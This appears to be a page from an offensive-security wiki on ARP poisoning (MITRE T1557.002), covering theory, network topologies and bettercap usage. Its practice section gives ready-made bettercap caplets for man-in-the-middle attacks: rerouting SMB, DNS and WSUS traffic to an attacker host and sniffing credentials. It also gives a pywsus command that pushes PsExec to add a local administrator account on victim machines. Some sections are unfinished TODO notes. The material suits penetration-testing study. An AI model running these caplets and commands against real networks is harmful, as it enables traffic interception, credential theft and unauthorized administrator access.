---
description: MITRE ATT&CK™ Sub-technique T1557.002
---

# ARP poisoning

## Theory

The ARP (Address Resolution Protocol) is used to link IPv4 addresses with MAC addresses, allowing machines to communicate within networks. Since that protocol works in broadcast, attackers can try to impersonate machines by answering ARP requests (_"Who is using address 192.168.56.1? I am!"_) or by flooding the network with ARP announcements (_"Hey everyone, nobody asked but I'm the one using address 192.168.56.1"_). This is called ARP spoofing (also called ARP poisoning).

### Proxy vs. Rerouting

The two major use cases of ARP spoofing are the following.

1. **Proxy**: intercepting, forwarding and snooping or tampering with packets exchanged between a client and a server. This technique usually implies that the attacker has to poison the client's ARP table and replace the server's MAC address in it by its own, but also the server's ARP table (or the gateway's depending on the [network topology](arp-poisoning.md#network-topology)) to replace the client's MAC address in it by its own. Outgoing and incoming packets then get intercepted and can be tampered with or spied on.
2. **Rerouting**: Intercepting a set of packets sent by a client to a server and forwarding them to an evil server. This technique implies that the attacker only has to poison the client's ARP table and replace the server's MAC address in it by its own. The attacker then has to have an evil server capable of behaving like the spoofed one.

### Attack scenarios

There are multiple scenarios where ARP spoofing can be used to operate lateral movement within Active Directory domains (not an comprehensive list).

1. [NTLM capture](../ntlm/capture.md) and [NTLM relay](../ntlm/relay.md) : spoof an SMB server and reroute received SMB packets to internal capture or relay servers **(rerouting technique)**.
2. [DNS spoofing](dns-spoofing.md) : spoof an internal DNS server, so that DNS queries can be answered with fake resolutions **(rerouting technique)**.
3. [WSUS spoofing](wsus-spoofing.md) : spoof the WSUS server and deliver evil configurations to Windows clients. This can either be done by intercepting all update request and running a fully functional WSUS server **(rerouting technique)** or by intercepting, forwarding and tampering packets between clients and the legitimate WSUS server **(proxy technique)**.&#x20;
4. [Dumping network secrets](../credentials/dumping/network-protocols.md) : reroute any traffic and dump secrets that were insecurely sent (i.e. FTP, HTTP,  SMTP, ...). In this scenario, both outgoing and incoming traffic should be captured. This implies the poisoning of both the client's and the server's ARP tables **(proxy technique)**.

### Network topology

Besides the scenarios mentioned above, many network topologies exist and ARP poisoning attacks need to be carefully prepared based on that topology. Below are some common examples.

1. **One segment**: the client, the server, and the attacker are on the same network segment. The ARP tables can be poisoned with the attacker spoofing either the client or the server.
2. **Two segments**: the client and the attacker are on the same network segment but the server is on another one. For a hijacking attack, the client's ARP table can be poisoned with the attacker posing as the client's gateway. For a relaying attack, the gateway's ARP table also has to be poisoned with the attacker posing as the client.&#x20;
3. **Three segments**: all three machines are on different network segments. For both hijacking and relaying attacks, I'm not sure what can be done... :man\_shrugging:&#x20;

## Practice

{% hint style="danger" %}
Since spoofing every address in a subnet can cause temporary but severe disruption in that subnet, it is highly recommended to target specific addresses and machines while doing ARP spoofing.
{% endhint %}

The best tool to operate ARP poisoning is [bettercap](https://www.bettercap.org/) (Go) and for the majority of the scenarios, basic knowledge of the iptables utility is required.

### Networking

In order to forward packets, the system has to be prepared accordingly. The first step is to make sure the system firewall can effectively forward packets. The easiest way of achieving this is to write an `ACCEPT` policy in the `FORWARD` chain.

```bash
iptables --policy FORWARD ACCEPT
```

### ARP poisoning

Bettercap's [arp.spoof](https://www.bettercap.org/modules/ethernet/spoofers/arp.spoof/) module has multiple options that allow multiple scenarios

* `arp.spoof.targets` is the list of targets whose ARP tables will be poisoned
* `arp.spoof.internal` is an option that allows bettercap to choose which addresses to spoof. If set to `true`, machines from the same subnet as the client victim will be spoofed (i.e. their IP addresses will be matched to the attacker's MAC address on the victim client's ARP table). To put it simply, this option needs to be set to `true` when the attacker wants to be the man-in-the-middle between two machines of a same subnet. When the victim client and the spoofed server are on different subnets, this option can be left to `false`.
* `arp.spoof.fullduplex` is an option that, when set to `true`, will make bettercap automatically try to poison the gateway's ARP table so that packets aimed at the victim client also get intercepted.
* `arp.spoof` is a trigger to set to `on` when starting the ARP poisoning, `off` when stopping it. This trigger will also enable packets forwarding (i.e. write `1` in `/proc/sys/net/ip/ip_forward`) while the `arp.ban` trigger will disabled that and the poisoned victim will not have access to the spoofed machines anymore.

### Packet forwarding

Bettercap also has the [any.proxy](https://www.bettercap.org/modules/ethernet/proxies/any.proxy/) module that has multiple options to allows multiple scenarios

* `any.proxy.iface` allows to set the interface to redirect packets from
* `any.proxy.protocol` can be set to `UDP` or `TCP` to specify on which transport protocol the packets to reroute will transit&#x20;
* `any.proxy.src_address` refers to the destination address of the packets to reroute. This usally has to be set to the spoofed server IP address. Packets that were originally sent to that server will be rerouted and sent to another one. This option has to be set when doing the rerouting technique.This option can be blank. Bettercap will then reroute every packet received without filtering on the address. For instance, this is useful when doing a WSUS or DNS spoofing attack on multiple victims at the same time.
* `any.proxy.src_port` refers to the destination port of the packets to reroute. This usally has to be set to the spoofed service port. Packets that were originally sent to that server will be rerouted and sent to another one. This option has to be set when doing the rerouting technique.
* `any.proxy.dst_address` refers to the IP address the matched packets are to be sent to. For instance, when doing WSUS or DNS spoofing attacks in a rerouting technique mode, this option has to be set to the IP address of the attacker's server.
* `any.proxy.dst_port` refers to the port the matched packets are to be sent to.

### 🛠️ Bettercap logging

Bettercap's logging can be controlled so that only essential information is shown. Becoming a man-in-the-middle can be a little overwhelming when not filtering the info shown to the user.

* events.ignore TODOOOOO //

### 🛠️ Tips & tricks

* wireshark, make sure forwarded packets appear twice, one with MAC 1 -> MAC 2, one with MAC 2 -> MAC 3 (1=victim, 2=attacker, 3=gateway)
* Make sure the attacker and the victim client are on the same subnet, I don't know how to operate when they are not
* tracert on the client to make sure packets are forwarded if possible
* make sure it's not the DNS
* make sure the iptables rules are ok and allow forwarding --> [networking](arp-poisoning.md#network-filter)
* make sure to run bettercap in a privileged container with network host
* options can be written in a `.cap` file and launched with bettercap with the following command and options`bettercap --iface $interface --caplet caplet.cap`

## Scenarios examples

Below are examples or targetted ARP poisoning attacks where the attacker wants to hijack packets aimed at a specific server (SMB, DNS, WSUS, ...), to answer with evil responses. The "dumping network secrets" scenario is the one attackers use to [dump credentials on the network](../credentials/dumping/network-protocols.md) (usually in order to find an initial foothold).

{% tabs %}
{% tab title="SMB spoofing" %}
Start the SMB server for [capture](../ntlm/capture.md) or [relay](../ntlm/relay.md) then start the poisoning attack.

{% code title="smb_spoofing.cap" %}
```bash
# quick recon of the network
net.probe on

# set the ARP spoofing
set arp.spoof.targets $client_ip
set arp.spoof.internal false
set arp.spoof.fullduplex false

# reroute traffic aimed at the original SMB server
set any.proxy.iface $interface
set any.proxy.protocol TCP
set any.proxy.src_address $SMB_server_ip
set any.proxy.src_port 445
set any.proxy.dst_address $attacker_ip
set any.proxy.dst_port 445

# control logging and verbosity
events.ignore endpoint
events.ignore net.sniff.mdns

# start the modules
any.proxy on
arp.spoof on
net.sniff on
```
{% endcode %}
{% endtab %}

{% tab title="DNS spoofing" %}
Start the DNS server ([responder](https://github.com/lgandx/Responder), [dnschef](https://github.com/iphelix/dnschef), or [bettercap](https://github.com/bettercap/bettercap)) for [DNS poisoning](dns-spoofing.md) then start the ARP poisoning attack.

{% code title="dns_spoofing.cap" %}
```bash
# quick recon of the network
net.probe on

# set the ARP spoofing
set arp.spoof.targets $client_ip
set arp.spoof.internal false
set arp.spoof.fullduplex false

# reroute traffic aimed at the original DNS server
set any.proxy.iface $interface
set any.proxy.protocol UDP
set any.proxy.src_address $DNS_server_ip
set any.proxy.src_port 53
set any.proxy.dst_address $attacker_ip
set any.proxy.dst_port 53

# control logging and verbosity
events.ignore endpoint
events.ignore net.sniff.mdns

# start the modules
any.proxy on
arp.spoof on
net.sniff on
```
{% endcode %}
{% endtab %}

{% tab title="WSUS spoofing" %}
ARP poisoning for [WSUS spoofing ](wsus-spoofing.md)in a two-subnets layout (attacker + client in the same segment, legitimate WSUS server in another one). Packets from the client to the WSUS server need to be hijacked and sent to the attacker's evil WSUS server. In order to do so, the attacker must pose as the client's gateway, route all traffic to the real gateway except the packets destined to the WSUS server.

The evil WSUS server needs to be started before doing ARP poisoning. The [pywsus ](https://github.com/GoSecure/pywsus)(Python) utility can be used for that matter.

```bash
python3 pywsus.py --host $network_facing_ip --port 8530 --executable /path/to/PsExec64.exe --command '/accepteula /s cmd.exe /c "net user testuser /add && net localgroup Administrators testuser /add"'
```

Once the WSUS server is up and running, the ARP poisoning attack can start.

{% code title="wsus_spoofing.cap" %}
```bash
# quick recon of the network
net.probe on

# set the ARP spoofing
set arp.spoof.targets $client_ip
set arp.spoof.internal false
set arp.spoof.fullduplex false

# reroute traffic aimed at the WSUS server
set any.proxy.iface $interface
set any.proxy.protocol TCP
set any.proxy.src_address $WSUS_server_ip
set any.proxy.src_port 8530
set any.proxy.dst_address $attacker_ip
set any.proxy.dst_port 8530

# control logging and verbosity
events.ignore endpoint
events.ignore net.sniff.mdns

# start the modules
any.proxy on
arp.spoof on
net.sniff on
```
{% endcode %}

The caplet above can be loaded with the following command in order to launch the ARP poisoning attack.

```bash
bettercap --iface $interface --caplet wsus_spoofing.cap
```

The search for Windows updates can be manually triggered when having access to the target computer by going to `Settings > Update & Security > Windows Update > Check for updates`.
{% endtab %}

{% tab title="Dumping network secrets" %}
Start [PCredz](https://github.com/lgandx/PCredz) or Wireshark then start the poisoning attack

{% code title="spoofing.cap" %}
```bash
# quick recon of the network
net.probe on

# set the ARP poisoning
set arp.spoof.targets $client_ip
set arp.spoof.internal true
set arp.spoof.fullduplex true

# control logging and verbosity
events.ignore endpoint
events.ignore net.sniff.mdns

# start the modules
arp.spoof on
net.sniff on
```
{% endcode %}
{% endtab %}
{% endtabs %}

## 🛠️ Below this is info I need to RTFM on...

What is iptables -j MASQUERADE and why do I see it all the time in articles and blogs

## Resources

{% embed url="http://g-laurent.blogspot.com/2016/10/introducing-responder-multirelay-10.html" %}

{% embed url="https://luemmelsec.github.io/Relaying-101/#arp-spoofing" %}

{% embed url="https://www.bettercap.org/modules/ethernet/spoofers/arp.spoof/" %}

{% embed url="https://ivanitlearning.wordpress.com/2019/04/07/arp-dns-poisoning-with-bettercap-and-impacket-ntlmrelayx/" %}
